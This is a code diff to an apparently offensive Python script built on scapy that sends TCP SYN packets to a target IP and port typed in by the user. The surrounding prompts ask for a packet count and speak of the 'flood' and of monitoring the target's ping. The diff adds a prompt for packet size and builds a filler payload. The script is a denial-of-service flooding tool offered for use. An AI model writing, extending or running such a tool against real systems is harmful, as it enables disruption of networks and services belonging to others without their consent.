@@ -2,6 +2,8 @@ import os
 from scapy.all import * 
 
 def send_syn(TCP_IP, TCP_PORT):
+    payload_size = (packet_size)
+    payload = b'X' * payload_size 
     ip = IP(dst=TCP_IP)
     tcp = TCP(dport=TCP_PORT, flags='S')
     packet = ip/tcp
@@ -54,6 +56,7 @@ print(color_red("""
 
 TCP_IP = input(color_red("Enter the target IP address: "))
 TCP_PORT = int(input(color_red("Enter the target port number: ")))
+packet_size = int(input(color_red("Enter packet size in bytes (1-1460):")))
 print(color_yellow("File to monitor ping of " + TCP_IP + " will be created. Run ./FLOOD/ping.sh in a seperate terminal after flood has been initialized."))
 amount = int(input(color_red("Number of packets to send:")))
 
